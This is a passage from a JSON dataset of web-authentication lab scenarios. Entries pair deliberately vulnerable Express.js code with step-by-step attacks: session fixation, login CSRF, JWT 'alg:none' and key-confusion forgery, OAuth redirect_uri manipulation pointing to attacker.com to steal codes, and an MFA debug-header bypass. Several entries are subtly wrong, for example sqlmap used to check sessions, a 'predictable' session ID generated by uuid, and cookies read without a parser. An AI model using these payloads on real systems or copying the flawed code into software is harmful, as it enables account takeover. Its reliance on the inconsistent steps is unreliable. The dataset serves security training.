      "Lab scenario": "Session fixation via login CSRF vulnerability",
      "Lab Description": "The application is vulnerable to login CSRF. The session remains fixed after the victim logs in via a crafted form. To solve: Force the victim to log in with your session ID and access their account page using that session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Visit /login and get a fresh session ID via Burp",
        "Host an auto-submitting login form with victim credentials and set form action to /login",
        "Embed this form in a phishing page using an <iframe>",
        "Trick the victim to visit the phishing page, forcing them to log in with your session",
        "Use the fixed session ID to access /account as the victim"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixate', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: false })); const users = { carlos: 'secret123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) req.session.user = username; res.redirect('/account'); }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "<form action='http://vulnerable-site.com/login' method='POST'><input name='username' value='carlos'><input name='password' value='secret123'></form><script>document.forms[0].submit();</script>",
        "Reuse session ID: Cookie: session=attackerSession"
      ]
    },
    {
      "Lab scenario": "JWT signature bypass via public key as HMAC key",
      "Lab Description": "The application uses asymmetric RSA to sign JWTs but mistakenly verifies tokens using the public key with the HMAC algorithm. To solve: Forge a token for 'admin' using RS256 public key with HS256 algorithm.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept a token from /login using Burp",
        "Extract the public key from /jwks or embedded source",
        "Use jwt.io to forge a token with alg='HS256' and key = public key",
        "Set user='admin' in payload and sign with public key as HMAC secret",
        "Send token in Authorization header to /account"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const pubKey = fs.readFileSync('./public.pem'); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const verified = jwt.verify(token, pubKey); res.send(`Welcome ${verified.user}`); } catch { res.status(403).send('Forbidden'); } }); app.listen(3000);",
      "payloads": [
        "Header: { \"alg\": \"HS256\" }",
        "Payload: { \"user\": \"admin\" }",
        "Sign with public key using HMAC"
      ]
    },
    {
      "Lab scenario": "GraphQL endpoint leaking verbose JWT decoding errors",
      "Lab Description": "The GraphQL API performs JWT validation and returns verbose error messages on failure. These errors help brute-force or guess the signing key. To solve: Identify the key from error feedback and forge a token to access the victim's account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send malformed JWTs via Postman to the /graphql endpoint",
        "Observe stack traces or signature mismatch errors in response",
        "Use jwt-hack tool to brute-force the secret from error messages",
        "Forge a JWT with 'admin' as username and sign using discovered secret",
        "Submit GraphQL query with forged Authorization token"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const jwt = require('jsonwebtoken'); const app = express(); const SECRET = 'adminsecret'; const schema = buildSchema('type Query { hello: String }'); const root = { hello: (args, context) => { const token = context.headers.authorization?.split(' ')[1]; const decoded = jwt.verify(token, SECRET); return `Welcome ${decoded.user}`; } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, graphiql: true, context: req }))); app.listen(3000);",
      "payloads": [
        "Send invalid signature token to /graphql",
        "Extract error: jwt signature invalid",
        "Forge token with {\"user\":\"admin\"} signed using 'adminsecret'"
      ]
    },
    {
      "Lab scenario": "Persistent session reuse in SOAP login API",
      "Lab Description": "The SOAP API returns session tokens that are valid indefinitely and reused across logins. These tokens can be harvested from logs or URLs. To solve: Reuse a captured token for the admin and access their account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Send a SOAP login request and inspect the XML response in Burp",
        "Harvest the <sessionToken> returned",
        "Replay the token via SOAP or REST using Authorization header",
        "Try token reuse for different users by modifying token value",
        "Access /account using a working token for admin"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.text()); const tokens = { admin: 'admintoken123' }; app.post('/soap', (req, res) => { if (req.body.includes('<username>admin</username>') && req.body.includes('<password>adminpass</password>')) return res.send('<sessionToken>admintoken123</sessionToken>'); res.send('<error>Invalid</error>'); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'admintoken123') res.send('Welcome admin'); else res.status(403).send('Denied'); }); app.listen(3000);",
      "payloads": [
        "<soap><username>admin</username><password>adminpass</password></soap>",
        "Authorization: Bearer admintoken123"
      ]
    },
    {
      "Lab scenario": "JWT with static secret across users",
      "Lab Description": "The JWT implementation uses a hardcoded static secret, same for all users. An attacker can sign their own tokens once the key is known. To solve: Discover the shared secret and forge a token for 'admin'.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Log in and capture your JWT via Burp",
        "Use jwt.io to decode the token and observe claims",
        "Try common secrets (e.g., 'secret', 'jwtsecret') with jwt-cracker",
        "Once secret is guessed, forge a token for 'admin'",
        "Set Authorization header with forged token and access /account"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const SECRET = 'jwtsecret'; app.get('/login', (req, res) => { const token = jwt.sign({ user: 'attacker' }, SECRET); res.send(token); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); res.send(`Welcome ${decoded.user}`); } catch { res.status(403).send('Invalid'); } }); app.listen(3000);",
      "payloads": [
        "Header: { \"alg\": \"HS256\" }",
        "Payload: { \"user\": \"admin\" }",
        "Secret: jwtsecret"
      ]
    },
    {
      "Lab scenario": "Session ID exposed in referrer header",
      "Lab Description": "The app sets session tokens in URLs for internal redirections. These URLs are leaked via the Referer header. To solve: Capture a valid session token via referrer and reuse it to access /account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Click a button that redirects to /account?sid=token123",
        "Inspect the Referer header from this request to another domain",
        "Harvest the session ID from the Referer",
        "Send a new request with Cookie: session=token123",
        "Confirm session hijack via access to /account"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const sessions = { 'token123': 'carlos' }; app.get('/redirect', (req, res) => { res.redirect(`/account?sid=token123`); }); app.get('/account', (req, res) => { const sid = req.query.sid || req.cookies.session; const user = sessions[sid]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "GET /account?sid=token123",
        "Referer: http://vulnerable-site.com/account?sid=token123"
      ]
    },
  {
    "Lab scenario": "Session Fixation via Unvalidated Token in REST Login Flow",
    "Lab Description": "The application implements a login system that uses a session ID passed via a query parameter to maintain state. However, the server fails to invalidate pre-authenticated session IDs. This leads to a session fixation vulnerability. The application allows attackers to fix the victim's session ID before they log in. To solve: hijack Carlos's session by setting a known session ID and forcing him to authenticate with it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login process and identify the sessionId parameter passed in the URL or as a cookie.",
      "2. Observe that the sessionId is accepted and reused across multiple requests before and after authentication.",
      "3. Use OWASP ZAP to replay a login request with a manually fixed sessionId (e.g., sessionId=attacker123).",
      "4. Craft a phishing email or CSRF link to trick Carlos into logging in using the fixed session ID.",
      "5. Once Carlos logs in, reuse the same session ID to access the /my-account endpoint and confirm access to Carlos’s session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'secure123' }]; app.get('/login', (req, res) => { const { username, password, sessionId } = req.query; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); sessions[sessionId] = username; res.cookie('sessionId', sessionId).send('Logged in'); }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.sessionId; const username = sessions[sessionId]; if (username) { res.send('Account details for ' + username); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "/login?username=carlos&password=secure123&sessionId=attacker123",
      "Cookie: sessionId=attacker123",
      "GET /my-account"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Forgery in GraphQL Auth Token",
    "Lab Description": "The application uses JWT for GraphQL authentication but fails to validate the token algorithm properly. The `alg` field is user-controlled and defaults to `none` if missing or set improperly. The application signs JWTs with a symmetric key but trusts tokens without signatures when `alg` is set to `none`. To solve: craft a JWT with `alg:none` and impersonate Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to inspect a valid JWT returned after logging in.",
      "2. Decode the JWT and observe the `alg` header and the payload containing the username.",
      "3. Modify the JWT header to {\"alg\":\"none\"} and set the payload to {\"username\":\"carlos\"}.",
      "4. Remove the signature part completely and send the modified token in the Authorization header using GraphQL.",
      "5. Query a protected field such as getAccountDetails in the /graphql endpoint and verify access as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'topsecret'; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload.username; } else { try { const verified = jwt.verify(token, SECRET); req.user = verified.username; } catch { return res.status(403).send('Invalid token'); } } if (req.body.query.includes('getAccountDetails')) { res.send({ data: { account: req.user } }); } else { res.status(400).send('Unsupported query'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}",
      "JWT: base64url(header) + '.' + base64url(payload) + '.'",
      "Authorization: Bearer [forged_token]",
      "POST /graphql { \"query\": \"{ getAccountDetails { name } }\" }"
    ]
  },
  {
    "Lab scenario": "OAuth Client Misconfiguration via Redirect URI Manipulation",
    "Lab Description": "The application integrates OAuth for third-party login but improperly validates the `redirect_uri` parameter. This allows an attacker to manipulate the URI to a domain they control. By injecting a malicious redirect URI, the attacker can capture a valid authorization code. To solve: obtain Carlos's access token using a manipulated `redirect_uri` and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to capture the OAuth login redirection request, especially the authorization code request.",
      "2. Observe that the `redirect_uri` parameter is not validated strictly against registered URIs.",
      "3. Change the redirect_uri parameter to point to your attacker-controlled server and resend the request.",
      "4. Once the victim logs in and authorizes the app, capture the authorization code from your server logs.",
      "5. Exchange the stolen code for an access token, and use Postman to send it in a request to /profile to confirm Carlos’s access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const clients = [{ client_id: 'trustedApp', redirect_uri: 'http://localhost:4000/callback' }]; const codes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, username } = req.query; const code = 'authcode123'; codes[code] = username; res.redirect(redirect_uri + '?code=' + code); }); app.post('/token', (req, res) => { const { code } = req.body; const user = codes[code]; if (user) { const token = 'token-' + user; tokens[token] = user; res.send({ access_token: token }); } else { res.status(400).send('Invalid code'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user) { res.send('Profile of ' + user); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "GET /authorize?client_id=trustedApp&redirect_uri=http://attacker.com/callback&username=carlos",
      "Intercepted code: authcode123",
      "POST /token { code: authcode123 }",
      "Authorization: Bearer token-carlos",
      "GET /profile"
    ]
  },
  {
    "Lab scenario": "OAuth session fixation in authentication callback",
    "Lab Description": "This lab implements OAuth-based login and contains a session fixation vulnerability. The application fails to generate a new session ID after OAuth login. An attacker can set their session ID prior to the victim's login and hijack their session post-login. To solve: hijack Carlos's account by pre-fixing a session and accessing his account page after login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the login OAuth flow starting at /auth/login and observe the session cookie",
      "Send GET /auth/login to Burp Repeater, inject a custom session cookie (e.g., attacker-session=xyz123)",
      "Use an iframe or trick to force Carlos to log in using the same session value",
      "After Carlos completes OAuth login, reuse the attacker-session cookie and access /my-account",
      "Confirm successful session fixation by viewing Carlos's account page"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); const users = { carlos: { role: 'user' } }; app.get('/auth/login', (req, res) => { res.redirect('/auth/callback?token=fake-oauth-token'); }); app.get('/auth/callback', (req, res) => { const token = req.query.token; if (token === 'fake-oauth-token') { req.session.user = 'carlos'; res.redirect('/my-account'); } else { res.status(401).send('OAuth failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send('Welcome ' + req.session.user); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "Cookie: attacker-session=xyz123",
      "GET /auth/login with predefined session cookie",
      "GET /my-account using stolen session ID"
    ]
  },
  {
    "Lab scenario": "JWT signature confusion in REST API",
    "Lab Description": "This lab uses a JWT-based authorization mechanism and is vulnerable to signature confusion via the 'none' algorithm. The application accepts JWTs with the 'alg' field set to 'none' and does not verify the signature. To solve: craft a forged token that impersonates Carlos and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture the login request using Postman or Burp and extract the JWT from Authorization: Bearer header",
      "Use jwt.io or manual decoding to inspect the payload",
      "Create a modified JWT with 'alg':'none' and 'sub':'carlos'",
      "Remove the signature entirely and send the token in Authorization header",
      "Access /admin/dashboard with the forged token and verify admin access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'topsecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username, role: 'user' }, secret); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.sub === 'carlos') return res.send('Admin access granted'); } jwt.verify(token, secret); res.status(403).send('Invalid token'); } catch { res.status(403).send('Error processing token'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJyb2xlIjoiYWRtaW4ifQ.",
      "Authorization: Bearer [none-alg token]",
      "GET /admin/dashboard"
    ]
  },
  {
    "Lab scenario": "MFA bypass due to logic flaw in SOAP endpoint",
    "Lab Description": "This lab uses SOAP-based login with MFA verification. The backend fails to verify the MFA token when a specific debug header is set. This can be exploited to bypass 2FA entirely. To solve: log in as Carlos without knowing the MFA code by bypassing the second step using the debug header.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the SOAP request to /soap/login",
      "Observe the two-step process: login and then verifyMFA via SOAP actions",
      "Resend the verifyMFA SOAP request with header Debug-Bypass: true",
      "Modify the username to Carlos and skip sending the token",
      "Confirm access by sending a getAccountDetails SOAP request"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.text({ type: 'text/xml' })); const users = { carlos: { password: 'pass123', mfa: '000999' } }; app.post('/soap/login', (req, res) => { const xml = req.body; if (xml.includes('<action>login</action>')) { res.send('<response>Login success. Send MFA token.</response>'); } else if (xml.includes('<action>verifyMFA</action>')) { if (req.headers['debug-bypass'] === 'true') return res.send('<response>Access granted (debug bypass)</response>'); if (xml.includes(users.carlos.mfa)) return res.send('<response>Access granted</response>'); res.status(403).send('<response>Invalid token</response>'); } }); app.listen(3000);",
    "payloads": [
      "SOAPAction: verifyMFA + Header: Debug-Bypass: true",
      "<soap><action>verifyMFA</action><user>carlos</user></soap>",
      "POST /soap/login with spoofed SOAP payload"
    ]
  },
    {
      "Lab scenario": "JWT signature trust confusion in multi-algorithm implementation",
      "Lab Description": "The application uses JSON Web Tokens (JWT) to manage user sessions and supports multiple algorithms for signature verification. It mistakenly treats 'none' algorithm as valid when certain conditions are met, due to a flawed library wrapper. The application validates tokens signed with 'HS256' and mistakenly trusts unsigned tokens if the header is manipulated. To solve: craft a valid unsigned JWT granting admin privileges and access the /admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a valid JWT from a login session.",
        "Send the JWT to Burp Decoder and modify the alg field in the header to 'none'.",
        "Remove the signature section entirely from the token.",
        "Change the payload to {\"user\":\"admin\"}.",
        "Send the token in Authorization: Bearer <token> and access /admin to verify successful privilege escalation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'topsecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.user !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome admin'); } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(3000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
      ]
    },
    {
      "Lab scenario": "Session fixation via Set-Cookie path scoping",
      "Lab Description": "The application creates a new session for users only after a successful login but uses a fixed session identifier that is scoped to a non-authentication path. Due to improper path scoping on Set-Cookie headers, attackers can fix a session ID before login. To solve: inject a known session ID before the victim logs in and hijack the session after login.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to inspect Set-Cookie headers from GET /search.",
        "Observe Set-Cookie: sessionId=value; Path=/search which is reused after login.",
        "Manually set the cookie sessionId=attackerSessionId via Burp Proxy.",
        "Send the session fixation link to the victim, who logs in while using the attackerSessionId.",
        "Reuse the same attackerSessionId in your session to access /my-account as the victim."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': 's3cr3t' }; const sessions = {}; app.get('/search', (req, res) => { res.setHeader('Set-Cookie', 'sessionId=fixed123; Path=/search'); res.send('Search page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.sessionId; sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send('Account: ' + user); else res.status(403).send('Forbidden'); }); app.listen(3000);",
      "payloads": [
        "Set-Cookie: sessionId=fixed123; Path=/search",
        "sessionId=fixed123"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow token leakage via referer header",
      "Lab Description": "The application uses OAuth 2.0 implicit grant for third-party login and redirects access tokens in the URL fragment (#). However, the application incorrectly loads third-party content after the redirect, exposing the token in the Referer header. To solve: leak Carlos's access token and use it to access his account via the API.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to log in via the third-party OAuth provider.",
        "Observe the redirect contains #access_token= in the URL fragment.",
        "Capture the Referer header from any subsequent third-party content loads after the redirect.",
        "Extract the access_token from the Referer header.",
        "Send GET /api/userinfo with Authorization: Bearer <leaked_token> to access Carlos’s data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': 'token-carlos' }; app.get('/callback', (req, res) => { res.send('<iframe src=\"https://cdn.thirdparty.com/widget.js\"></iframe>'); }); app.get('/api/userinfo', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No auth'); const token = auth.split(' ')[1]; const user = Object.entries(users).find(([k, v]) => v === token); if (user) res.send('User info for ' + user[0]); else res.status(403).send('Invalid token'); }); app.listen(3000);",
      "payloads": [
        "https://target.com/callback#access_token=token-carlos",
        "Authorization: Bearer token-carlos"
      ]
    },
  {
    "Lab scenario": "Session Fixation in Cookie-Based Auth Mechanism",
    "Lab Description": "This lab contains a session fixation vulnerability in its cookie-based login process. The application assigns session identifiers before authentication and fails to invalidate them upon login. To solve: Hijack Carlos's session by fixing the session cookie before he logs in and then access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the unauthenticated GET /login request using Burp Suite and observe the Set-Cookie header establishing a session ID.",
      "Send the login page link with a preset session ID to Carlos using the fixed cookie (simulate via cookie header in Repeater).",
      "Use sqlmap or OWASP ZAP to confirm that the same session ID persists post-authentication.",
      "Wait or simulate Carlos logging in using that preset session ID.",
      "Replay a GET /my-account request using that fixed session cookie and confirm access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'carlospass' }]; let sessions = {}; app.get('/login', (req, res) => { let sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sid] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sid]; if (username) res.send('Welcome ' + username); else res.send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "Cookie: sid=attackersession123",
      "GET /login HTTP/1.1 with attacker-controlled sid cookie",
      "Send login link to victim with preset sid=attackersession123",
      "GET /my-account with Cookie: sid=attackersession123"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Authentication Bypass",
    "Lab Description": "The application uses JWTs for authentication but fails to validate the token signature properly when the 'alg' field is set to 'none'. To solve: Forge a token with the 'none' algorithm to impersonate Carlos and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT after logging in using Burp Suite or Postman.",
      "Use jwt.io or a custom script to decode the token and inspect the header and payload.",
      "Modify the token header to {\"alg\":\"none\"} and change the payload to {\"username\":\"carlos\"}.",
      "Remove the signature part of the JWT entirely.",
      "Replay the modified token in an Authorization: Bearer header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { res.send('Welcome ' + decoded.payload.username); } else { jwt.verify(token, 'secret'); res.send('Verified user'); } } catch (err) { res.status(403).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}",
      "JWT: base64(header).base64(payload).",
      "Authorization: Bearer <unsigned_token>"
    ]
  },
  {
    "Lab scenario": "OAuth Redirect URI Manipulation for Access Token Theft",
    "Lab Description": "The OAuth 2.0 implementation does not properly validate redirect URIs, allowing an attacker to inject a malicious URI and intercept the authorization code. To solve: Steal an access token for Carlos and use it to access his account via the OAuth-protected API.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate an OAuth flow using the vulnerable app, observe the redirect_uri parameter.",
      "Intercept and modify the redirect_uri to your attacker-controlled domain using Burp Suite.",
      "Receive the authorization code on your domain and extract it.",
      "Exchange the stolen code for an access token via the legitimate /oauth/token endpoint using Postman.",
      "Use the stolen access token in the Authorization: Bearer header to access /api/my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const tokens = {}; const users = { 'carlos': { id: 1, name: 'Carlos', token: 'car123token' } }; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; res.redirect(redirect_uri + '?code=abc123&state=' + state); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'abc123') res.json({ access_token: 'car123token' }); else res.status(400).send('Invalid code'); }); app.get('/api/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = Object.values(users).find(u => u.token === token); if (user) res.json({ user }); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "GET /authorize?client_id=abc&redirect_uri=https://attacker.com&state=xyz",
      "POST /token with body: code=abc123",
      "Authorization: Bearer car123token",
      "GET /api/my-account"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Predictable Session ID",
    "Lab Description": "The session management mechanism in this RESTful application issues session IDs before login. The session token is not regenerated upon successful login, allowing an attacker to fix a session ID. The application exposes verbose session tokens during pre-auth requests. To solve: hijack Carlos's session and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET /prelogin using Burp Suite and extract the session ID issued before login.",
      "Send a POST /login request using the same session ID and valid credentials to confirm reuse.",
      "Craft a phishing URL containing the session ID and send it to Carlos.",
      "When Carlos logs in, reuse the fixed session ID in a new browser session.",
      "Access /my-account to verify hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const uuid = require('uuid'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: { password: 'secure123' } }; app.get('/prelogin', (req, res) => { const sid = uuid.v4(); sessions[sid] = null; res.cookie('session', sid); res.send('Pre-auth session initialized'); }); app.post('/login', (req, res) => { const sid = req.cookies.session; const { username, password } = req.body; if (users[username] && users[username].password === password) { sessions[sid] = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid]) { res.send(`Welcome ${sessions[sid]}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "Phishing URL with fixed session ID: http://victim.site/prelogin?sid=attacker-session-id",
      "Manual Cookie: session=attacker-session-id"
    ]
  },
  {
    "Lab scenario": "JWT Algorithm Confusion with None Header",
    "Lab Description": "This application uses JWTs to verify user identity, but insecurely trusts the algorithm specified in the token header. The server uses HMAC with a secret key, but doesn't validate the algorithm field properly. To solve: forge a JWT with 'alg' set to 'none' and access the admin's profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT from an authenticated request using Burp Suite.",
      "Use jwt.io or Postman to decode the JWT and observe 'alg' is HS256.",
      "Craft a new JWT with 'alg' set to 'none' and change payload to {\"user\":\"admin\"}.",
      "Remove the signature part entirely to bypass verification.",
      "Send request to /admin-dashboard with forged JWT in Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'admin') return res.send('Welcome admin'); } else { jwt.verify(token, secret); if (decoded.payload.user === 'admin') return res.send('Welcome admin'); } } catch { res.status(401).send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"user\":\"admin\"}",
      "JWT: base64(header).base64(payload). (no signature)"
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Leakage via Redirect Manipulation",
    "Lab Description": "This OAuth-enabled application uses a vulnerable redirect URI mechanism. The redirect URL is not validated strictly, allowing open redirect exploitation to steal authorization codes. To solve: capture Carlos's OAuth code and exchange it for an access token to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the redirect flow during OAuth login.",
      "Identify open redirect vulnerability in redirect_uri parameter.",
      "Host a malicious redirect handler to log authorization codes.",
      "Send a phishing OAuth login link with redirect_uri pointing to your server.",
      "Capture code and use Postman to exchange it at /token endpoint and access /user/profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = {}; app.get('/authorize', (req, res) => { const { redirect_uri, client_id, response_type } = req.query; if (client_id === 'trusted-client' && response_type === 'code') { const code = 'oauth-code-123'; tokens[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid request'); } }); app.post('/token', (req, res) => { const { code } = req.body; const user = tokens[code]; if (user) { res.json({ access_token: `token-${user}` }); } else { res.status(401).send('Invalid code'); } }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') res.send('Welcome Carlos'); else res.status(403).send('Unauthorized'); }); app.listen(5000);",
